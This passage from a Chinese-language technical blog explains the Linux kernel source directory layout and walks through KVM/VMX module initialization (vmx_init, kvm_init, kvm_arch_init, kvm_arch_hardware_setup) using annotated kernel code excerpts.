class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  tools<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  usr<br>d----        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>                  virt<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>             <span class="hljs-number">31</span>   .get_maintainer.ignore<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">1280</span>   .gitignore<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">5537</span>   .mailmap<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">18693</span>   COPYING<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">97181</span>   CREDITS<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">2622</span>   Kbuild<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>            <span class="hljs-number">252</span>   Kconfig<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>         <span class="hljs-number">337034</span>   MAINTAINERS<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">56302</span>   Makefile<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>          <span class="hljs-number">18599</span> 󰪷  README<br>-a---        <span class="hljs-number">2018</span>/<span class="hljs-number">10</span>/<span class="hljs-number">13</span>     <span class="hljs-number">15</span>:<span class="hljs-number">11</span>           <span class="hljs-number">7485</span>   REPORTING-BUGS<br></code></pre></td></tr></table></figure><ol><li><strong>arch：</strong> 包含特定硬件架构的代码，如x86、ARM、MIPS等。不同的硬件架构在这个目录下有各自的子目录，包含了与架构相关的代码和配置文件。</li><li><strong>block：</strong> 包含块设备层的代码，处理块设备（硬盘等）的I/O操作和管理。</li><li><strong>certs：</strong> 包含用于签名Linux内核代码的证书文件，用于确保代码的可信度和完整性。</li><li><strong>crypto：</strong> 包含加密相关的代码，用于提供Linux内核中的加密和密码学功能。</li><li><strong>Documentation：</strong> 包含Linux内核的文档，提供开发者和用户的详细说明、使用指南和文档。</li><li><strong>drivers：</strong> 包含各种设备驱动的代码，涵盖了多种硬件设备，如网络适配器、显卡、声卡等。<strong>可以发现驱动文件夹占了源码中绝大多数的空间</strong></li><li><strong>firmware：</strong> 包含一些硬件设备的固件文件，这些文件在启动时或设备初始化时可能会用到。</li><li><strong>fs：</strong> 包含文件系统相关的代码，包括各种文件系统的实现，如EXT4、FAT、NTFS等。</li><li><strong>include：</strong> 包含用于编译Linux内核的头文件，这些头文件定义了内核中使用的结构体、宏等。</li><li><strong>init：</strong> 包含系统初始化和引导过程相关的代码，包括内核初始化和启动。</li><li><strong>ipc：</strong> 包含进程间通信（IPC）相关的代码，用于实现进程之间的通信和同步。</li><li><strong>kernel：</strong> 包含核心内核代码，包括调度器、中断处理、系统调用等。</li><li><strong>lib：</strong> 包含一些通用的库函数和工具函数，用于帮助内核开发。</li><li><strong>mm：</strong> 包含内存管理相关的代码，用于管理系统的物理内存和虚拟内存。</li><li><strong>net：</strong> 包含网络协议栈的代码，用于处理网络数据包的收发和处理。</li><li><strong>samples：</strong> 包含示例代码，用于演示某些功能的用法和实现。</li><li><strong>scripts：</strong> 包含一些用于构建和配置内核的脚本文件。</li><li><strong>security：</strong> 包含与系统安全性相关的代码，如访问控制、权限管理等。</li><li><strong>sound：</strong> 包含声音子系统的代码，用于处理声卡和音频相关的功能。</li><li><strong>tools：</strong> 包含一些辅助工具和调试工具，用于内核开发和调试。</li><li><strong>usr：</strong> 包含用户空间工具和应用程序的代码，这些工具可以在用户空间使用。</li><li><strong>virt：</strong> 包含虚拟化相关的代码，用于支持虚拟化技术。</li><li><code>.gitignore</code>、<code>.mailmap</code>、<code>COPYING</code>、<code>CREDITS</code>、<code>Kconfig</code>、<code>MAINTAINERS</code>、<code>Makefile</code>、<code>README</code> 等，这些文件包含了一些关于版权、许可证、贡献者、配置和文档等信息</li></ol><p>比较重要的目录</p><table><thead><tr><th>目录</th><th>关注点和重要性</th></tr></thead><tbody><tr><td>arch</td><td>硬件架构相关的代码，不同的硬件架构有各自的子目录。硬件架构和底层硬件的研究、实现和优化</td></tr><tr><td>kernel</td><td>核心内核代码，调度器、中断处理、系统调用等。操作系统内核功能和设计的研究和实现</td></tr><tr><td>drivers</td><td>各种设备驱动的代码，硬件设备的交互、优化和性能。设备驱动和硬件交互的研究和实现</td></tr><tr><td>mm</td><td>内存管理相关的代码，物理内存、虚拟内存的管理和优化。内存管理、内存优化和分配策略的研究</td></tr><tr><td>net</td><td>网络协议栈的代码，网络数据包的收发、协议实现和网络性能优化。网络协议、性能和优化的研究</td></tr><tr><td>security</td><td>系统安全性相关的代码，访问控制、权限管理和安全策略。操作系统安全性和安全策略的研究和实现</td></tr><tr><td>Documentation</td><td>Linux内核的文档，开发者和用户指南，理解和使用内核的重要资源。文档对于内核的理解和使用非常重要。</td></tr></tbody></table><p>KVM的不同虚拟化实现（Intel和AMD）都会<strong>向KVM模块注册一个kvm_x86_ops结构体</strong>。KVM中的一些函数可能<strong>首先会调用kvm_arch_xxx函数</strong>，xxx是架构类型，比如x86，则会调用kvm_x86_ops结构中的相关回调函数。<strong>kvm_x86_ops</strong>是一个结构体，包含了一组函数指针，用于处理在 x86 架构下的虚拟化操作。这些函数指针实际上是回调函数，它们实现了特定的虚拟化功能。</p><ul><li><strong>回调函数：</strong> 在 <code>kvm_x86_ops</code> 结构体中的每个函数指针都指向一个回调函数，这些函数是实际执行虚拟化操作的地方。</li><li><strong><code>kvm_arch_xxx</code> 函数：</strong> 这些是架构特定的函数，其名称中的 <code>xxx</code> 表示具体的架构类型，比如 <code>x86</code>。这些函数在 KVM 模块的实现中可能首先被调用，然后再根据具体的架构类型调用相应的<code>kvm_x86_ops</code> 中的函数。这样的架构分离使得 KVM 能够支持多种不同的硬件架构。</li><li><strong><code>kvm_x86_ops</code> 结构体：</strong> 这是一个包含一组函数指针的结构体，用于在 x86 架构下处理虚拟化操作。每个函数指针指向一个特定的函数，实现了特定的虚拟化功能。这些函数定义了 KVM 在 x86 架构下的行为和处理方式，可以根据需要进行扩展和定制。</li></ul><p>kvm.ko和kvm-intel.ko是两个内核模块，它们协同工作以实现KVM虚拟化</p><ol><li>kvm.ko：这是<strong>KVM的通用代码生成的内核模块</strong>。它本身在初始化阶段并不执行实际虚拟化任务，只是<strong>将通用的KVM代码加载到内存中，为KVM的其他组件提供支持</strong>。它<strong>导出了KVM的接口</strong>，这些接口将会暴露给用户空间，供用户程序调用。</li><li>kvm-intel.ko：这是针对Intel CPU架构的特定代码生成的内核模块。它<strong>负责实际的虚拟化功能</strong>，包括<strong>创建、管理和运行虚拟机</strong>。kvm-intel.ko会在KVM初始化完成后负责启动和关闭虚拟化，以及处理与Intel CPU架构相关的虚拟化任务。</li><li>当<strong>用户程序调用KVM接口</strong>来执行虚拟化任务时，<strong>kvm.ko中的通用代码将会调用kvm-intel.ko</strong>中的架构相关代码来<strong>处理实际的虚拟化操作</strong>。这包括在虚拟机中执行指令、管理虚拟设备等任务。</li></ol><p><img src="https://img.gls.show/img/20230813152054.png"></p><h3 id="4-2-2-KVM模块初始化"><a href="#4-2-2-KVM模块初始化" class="headerlink" title="4.2.2 KVM模块初始化"></a>4.2.2 KVM模块初始化</h3><p>KVM模块的初始化主要包括初始化CPU与架构无关的数据以及设置与架构相关的虚拟化支持</p><p>VMM只有在CPU处于保护模式并且开启分页时才能进入VMX模式</p><p>开启VMX模式需要做的事情</p><ol><li><p><strong>CPU支持检测：</strong> 通过CPUID指令的ECX寄存器的第5位来检测CPU是否支持VMX。</p></li><li><p><strong>VMX能力检测：</strong> 通过读取相关的MSR寄存器，如IA32_VMX_BASIC、IA32_VMX_PINBASED_CTLS和IA32_VMX_PROCBASED_CTLS，来检测CPU所支持的VMX能力。</p></li><li><p><strong>分配VMXON区域：</strong> 分配一段4KB对齐的内存作为VMXON区域，大小通过读取IA32_VMX_BASIC MSR寄存器确定。</p></li><li><p><strong>VMXON区域初始化：</strong> 通过MSR寄存器初始化VMXON区域，包括设置版本标识等信息。</p></li><li><p><strong>CR0和CR4寄存器设置：</strong> 确保当前CPU运行模式的CR0和CR4寄存器满足进入VMX的条件，需要满足的设置通过IA32_VMX_CR0_FIXED0和IA32_VMX_CR0_FIXED1、IA32_VMX_CR4_FIXED0和IA32_VMX_CR4_FIXED1寄存器报告。</p></li><li><p><strong>开启VMX模式：</strong> 设置CR4寄存器中的CR4.VMXE位为1，开启VMX模式。</p></li><li><p><strong>IA32_FEATURE_CONTROL寄存器设置：</strong> 确保IA32_FEATURE_CONTROL寄存器的锁定位（0位）为1，通常由BIOS进行设置。</p></li><li><p><strong>执行VMXON指令：</strong> 使用VMXON区域的物理地址作为操作数，调用VMXON指令以开启VMX模式。</p></li><li><p><strong>VMX模式的启动和关闭：</strong> 一旦进入VMX模式，可以在VMX root模式（CPL=0）下执行VMXOFF指令来关闭VMX模式。</p></li></ol><p>在VMX（Virtual Machine Extensions）模式下，VMX root操作模式是指处理器运行在特权级别0（CPL = 0）下的状态，即内核态。VMXOFF指令用于关闭VMX模式，将处理器从VMX操作模式切换回到非虚拟化的操作模式。为了确认VMX模式是否已经成功关闭，可以通过检查RFLAGS寄存器的CF（Carry Flag）和ZF（Zero Flag）位的值。</p><p>具体来说，在执行VMXOFF指令后，如果RFLAGS寄存器的CF和ZF都为0，这表示VMX模式已经成功关闭。这种情况下的解释如下：</p><ul><li>CF = 0：表示VMXOFF指令成功执行，没有发生错误。</li><li>ZF = 0：表示VMX模式已经成功退出，处理器不再处于虚拟化模式。</li></ul><p><strong>intel-kvm.ko的模块注册函数是vmx_init</strong>，其主要任务为<strong>调用架构无关函数kvm_init进行KVM模块的初始化</strong></p><p>vmx_init调用了kvm_init</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_x86_ops</span> <span class="hljs-title">vmx_x86_ops</span> =</span> &#123;<br>.cpu_has_kvm_support = cpu_has_kvm_support,<br>.disabled_by_bios = vmx_disabled_by_bios,<br><br>...<br><br>.vcpu_create = vmx_create_vcpu,<br><br>...<br><br>    .run = vmx_vcpu_run,<br><br>    .handle_exit = vmx_handle_exit,<br>...<br><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">vmx_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r = kvm_init(&amp;vmx_x86_ops, <span class="hljs-keyword">sizeof</span>(struct vcpu_vmx),<br>                     __alignof__(struct vcpu_vmx), THIS_MODULE);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">return</span> r;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KEXEC_CORE</span><br>rcu_assign_pointer(crash_vmclear_loaded_vmcss,<br>   crash_vmclear_local_loaded_vmcss);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>这段代码初始化KVM虚拟化，提供了VMX虚拟化实现的回调函数和相关参数，为后续的虚拟化操作做好了准备。在KVM初始化后，可以使用其他API来创建虚拟机、分配VCPU、设置寄存器等，以实现虚拟化功能</p><ol><li><code>kvm_init</code>: 这是一个用于初始化KVM的函数。它会执行一系列操作来启动KVM虚拟化，并返回一个整数结果以指示是否成功初始化。</li><li><code>&amp;vmx_x86_ops</code>: 这个参数是一个指向包含Intel VT-x虚拟化实现回调函数的结构体的指针（<strong>是kvm_x86_ops类型</strong>）。这个结构体包含了一系列回调函数，用于处理不同的虚拟化操作，如硬件检测、虚拟机创建、寄存器设置等。这些函数是特定于硬件的，用于实现VMX（Virtual Machine Extensions）虚拟化技术的支持。</li><li><code>sizeof(struct vcpu_vmx)</code>: 这是第二个参数，表示VMX实现的VCPU（Virtual CPU）结构体的大小。VCPU结构体包含了与虚拟CPU相关的信息和状态。</li><li><code>__alignof__(struct vcpu_vmx)</code>: 这是对VCPU结构体的对齐要求。这个参数通常用于确保结构体按照正确的字节对齐方式分配内存，以优化访问和操作。</li><li><code>THIS_MODULE</code>: 这是一个表示当前模块的标识符，用于标记KVM模块的所属。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *opaque, <span class="hljs-keyword">unsigned</span> vcpu_size, <span class="hljs-keyword">unsigned</span> vcpu_align,</span></span><br><span class="hljs-params"><span class="hljs-function">  struct <span class="hljs-keyword">module</span> *<span class="hljs-keyword">module</span>)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r;<br><span class="hljs-keyword">int</span> cpu;<br><br>r = kvm_arch_init(opaque);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_fail;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * kvm_arch_init makes sure there&#x27;s at most one caller</span><br><span class="hljs-comment"> * for architectures that support multiple implementations,</span><br><span class="hljs-comment"> * like intel and amd on x86.</span><br><span class="hljs-comment"> * kvm_arch_init must be called before kvm_irqfd_init to avoid creating</span><br><span class="hljs-comment"> * conflicts in case kvm is already setup for another implementation.</span><br><span class="hljs-comment"> */</span><br>r = kvm_irqfd_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_irqfd;<br><br><span class="hljs-keyword">if</span> (!zalloc_cpumask_var(&amp;cpus_hardware_enabled, GFP_KERNEL)) &#123;<br>r = -ENOMEM;<br><span class="hljs-keyword">goto</span> out_free_0;<br>&#125;<br><br>r = kvm_arch_hardware_setup();<br><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free_0a;<br><br>for_each_online_cpu(cpu) &#123;<br>smp_call_function_single(cpu,<br>kvm_arch_check_processor_compat,<br>&amp;r, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free_1;<br>&#125;<br><br>r = register_cpu_notifier(&amp;kvm_cpu_notifier);<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free_2;<br>register_reboot_notifier(&amp;kvm_reboot_notifier);<br><br><span class="hljs-comment">/* A kmem cache lets us meet the alignment requirements of fx_save. */</span><br><span class="hljs-keyword">if</span> (!vcpu_align)<br>vcpu_align = __alignof__(struct kvm_vcpu);<br>kvm_vcpu_cache = kmem_cache_create(<span class="hljs-string">&quot;kvm_vcpu&quot;</span>, vcpu_size, vcpu_align,<br>   <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!kvm_vcpu_cache) &#123;<br>r = -ENOMEM;<br><span class="hljs-keyword">goto</span> out_free_3;<br>&#125;<br><br>r = kvm_async_pf_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free;<br><br>kvm_chardev_ops.owner = <span class="hljs-keyword">module</span>;<br>kvm_vm_fops.owner = <span class="hljs-keyword">module</span>;<br>kvm_vcpu_fops.owner = <span class="hljs-keyword">module</span>;<br><br>r = misc_register(&amp;kvm_dev);<br><span class="hljs-keyword">if</span> (r) &#123;<br>pr_err(<span class="hljs-string">&quot;kvm: misc device register failed\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out_unreg;<br>&#125;<br><br>register_syscore_ops(&amp;kvm_syscore_ops);<br><br>kvm_preempt_ops.sched_in = kvm_sched_in;<br>kvm_preempt_ops.sched_out = kvm_sched_out;<br><br>r = kvm_init_debug();<br><span class="hljs-keyword">if</span> (r) &#123;<br>pr_err(<span class="hljs-string">&quot;kvm: create debugfs files failed\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out_undebugfs;<br>&#125;<br><br>r = kvm_vfio_ops_init();<br>WARN_ON(r);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>out_undebugfs:<br>unregister_syscore_ops(&amp;kvm_syscore_ops);<br>misc_deregister(&amp;kvm_dev);<br>out_unreg:<br>kvm_async_pf_deinit();<br>out_free:<br>kmem_cache_destroy(kvm_vcpu_cache);<br>out_free_3:<br>unregister_reboot_notifier(&amp;kvm_reboot_notifier);<br>unregister_cpu_notifier(&amp;kvm_cpu_notifier);<br>out_free_2:<br>out_free_1:<br>kvm_arch_hardware_unsetup();<br>out_free_0a:<br>free_cpumask_var(cpus_hardware_enabled);<br>out_free_0:<br>kvm_irqfd_exit();<br>out_irqfd:<br>kvm_arch_exit();<br>out_fail:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数调用分析</p><table><thead><tr><th>函数名</th><th>功能描述</th></tr></thead><tbody><tr><td>kvm_arch_init</td><td>初始化架构相关的代码。</td></tr><tr><td>kvm_irqfd_init</td><td>初始化irqfd相关的数据，主要是创建一个线程。</td></tr><tr><td>kvm_arch_hardware_setup</td><td>创建启动KVM时所需的数据结构，初始化硬件特性。</td></tr><tr><td>kvm_arch_check_processor_compat</td><td>检测所有CPU的特性是否一致。</td></tr><tr><td>注册通知对象</td><td>- kvm_cpu_notifier：用于CPU的热插拔时通知。<br>- kvm_reboot_notifier：系统重启时通知。</td></tr><tr><td>缓存VCPU结构体</td><td>将创建VCPU所需的cache赋值给kvm_vcpu_cache，用于快速分配VCPU空间。</td></tr><tr><td>设置file_operations的owner</td><td>将3个file_operations的owner设置为当前模块，分别对应不同的设备。</td></tr><tr><td>调用misc_register创建设备</td><td>创建名为kvm_dev的misc设备，将其file_operations设置为kvm_chardev_ops。</td></tr><tr><td>设置kvm_preempt_ops</td><td>设置kvm_preempt_ops的sched_in和sched_out，用于虚拟机VCPU所在线程被抢占或调度时的处理。</td></tr></tbody></table><p>kvm_arch_init作为通用代码一般都会调用kvm_arch_xxx这种与架构相关的代码，所以这个函数定义在arch/x86/kvm目录的x86.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_arch_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *opaque)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> r;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_x86_ops</span> *<span class="hljs-title">ops</span> =</span> opaque;<br><br><span class="hljs-keyword">if</span> (kvm_x86_ops) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: already loaded the other module\n&quot;</span>);<br>r = -EEXIST;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!ops-&gt;cpu_has_kvm_support()) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: no hardware support\n&quot;</span>);<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><span class="hljs-keyword">if</span> (ops-&gt;disabled_by_bios()) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: disabled by bios\n&quot;</span>);<br>r = -EOPNOTSUPP;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>r = -ENOMEM;<br>shared_msrs = alloc_percpu(struct kvm_shared_msrs);<br><span class="hljs-keyword">if</span> (!shared_msrs) &#123;<br>printk(KERN_ERR <span class="hljs-string">&quot;kvm: failed to allocate percpu kvm_shared_msrs\n&quot;</span>);<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br><br>r = kvm_mmu_module_init();<br><span class="hljs-keyword">if</span> (r)<br><span class="hljs-keyword">goto</span> out_free_percpu;<br><br>kvm_set_mmio_spte_mask();<br><br>kvm_x86_ops = ops;<br><br>kvm_mmu_set_mask_ptes(PT_USER_MASK, PT_ACCESSED_MASK,<br>PT_DIRTY_MASK, PT64_NX_MASK, <span class="hljs-number">0</span>);<br><br>kvm_timer_init();<br><br>perf_register_guest_info_callbacks(&amp;kvm_guest_cbs);<br><br><span class="hljs-keyword">if</span> (cpu_has_xsave)<br>host_xcr0 = xgetbv(XCR_XFEATURE_ENABLED_MASK);<br><br>kvm_lapic_init();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_X86_64</span><br>pvclock_gtod_register_notifier(&amp;pvclock_gtod_notifier);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>out_free_percpu:<br>free_percpu(shared_msrs);<br>out:<br><span class="hljs-keyword">return</span> r;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>首先，函数接受一个参数<code>opaque</code>，其中存储了KVM实现的结构体（例如，<code>vmx_x86_ops</code>），这些结构体包含了实现的回调函数等信息。</li><li>代码开始执行检查，确保只有一个KVM实现能够加载到内核。如果<code>kvm_x86_ops</code>已经存在，表示已加载其他模块，则打印错误并返回。</li><li>接着，通过调用<code>ops-&gt;cpu_has_kvm_support()</code>函数检测CPU是否支持VMX模式（对应开启条件1）。如果不支持，则打印错误并返回。</li><li>然后，通过调用<code>ops-&gt;disabled_by_bios()</code>函数检测是否被BIOS关闭（对应开启条件7）。如果被关闭，则打印错误并返回。</li><li>如果通过上述检查，首先分配一个percpu变量<code>shared_msrs</code>，用于存储共享的MSR寄存器数据。</li><li>调用<code>kvm_mmu_module_init()</code>函数初始化内存虚拟化工作。</li><li>调用<code>kvm_set_mmio_spte_mask()</code>函数设置MMIO内存的标识符。</li><li>将传递进来的KVM实现的结构体赋值给全局变量<code>kvm_x86_ops</code>。</li><li>执行一些初始化操作，如设置页表项的掩码、初始化计时器等。</li><li>注册性能回调函数，以便在性能分析中获取客户机信息。</li><li>如果CPU支持XSAVE指令集，获取主机的XCR0值。</li><li>最后，执行LAPIC（Local Advanced Programmable Interrupt Controller）的初始化，注册一个pvclock_gtod_notifier通知。</li></ul><p>kvm_arch_hardware_setup，同样，其主要调用了实现相关的vmx_x86_ops的hardware_setup成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// kvm_arch_hardware_setup 函数是KVM在硬件初始化阶段的架构特定部分。</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_arch_hardware_setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> r;<br><br>    <span class="hljs-comment">// 调用Intel虚拟化实现的 hardware_setup 函数进行硬件初始化操作。</span><br>    r = kvm_x86_ops-&gt;hardware_setup();<br>    <span class="hljs-keyword">if</span> (r != <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> r;<br><br>    <span class="hljs-comment">// 如果支持TSC控制，进行TSC相关的配置。</span><br>    <span class="hljs-keyword">if</span> (kvm_has_tsc_control) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 确保用户只能配置适合于有符号整数的 tsc_khz 值。</span><br><span class="hljs-comment">         * 